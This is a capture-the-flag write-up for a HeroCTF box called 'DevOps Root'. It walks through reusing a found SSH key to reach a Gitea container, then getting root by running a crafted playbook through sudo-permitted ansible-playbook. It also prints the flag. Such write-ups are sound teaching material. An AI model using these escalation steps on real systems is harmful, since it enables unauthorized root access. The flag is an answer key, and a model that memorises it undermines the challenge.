# DevOps Root

### Category

Box

### Description

Can you find the **root.txt flag** on the box ?

IP : **XXX.XX.XX.XX** (same as before)

Format : **Hero{flag}**<br>
Author : **xanhacks**

### Write up

Once you are on the gitea docker, you will find a **gitea.key**. You can find your docker internal IP with this command :

```
@jenkins $ hostname -I
172.27.0.1
```

So know you can try to log in to gitea by guessing his IP address.

```
@jenkins $ ssh git@172.27.0.2 -i gitea.key
Not working
@jenkins $ ssh git@172.27.0.3 -i gitea.key
Not working
@jenkins $ ssh git@172.27.0.4 -i gitea.key
@gitea $
```

If you do `sudo -l` you can see that you can execute `ansible-playbook` with `sudo`.
Let's create a malicious playbook.

```yaml
---
- name: Privesc
  hosts: localhost
  gather_facts: no

  tasks:
    - name: Flag
      shell: cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt 
```

Now you can read the flag :)

```
@gitea $ cat /tmp/root.txt
HeroCTF{ce4e994cb477dec9b1ea876db647c562}
```

### Flag

HeroCTF{ce4e994cb477dec9b1ea876db647c562}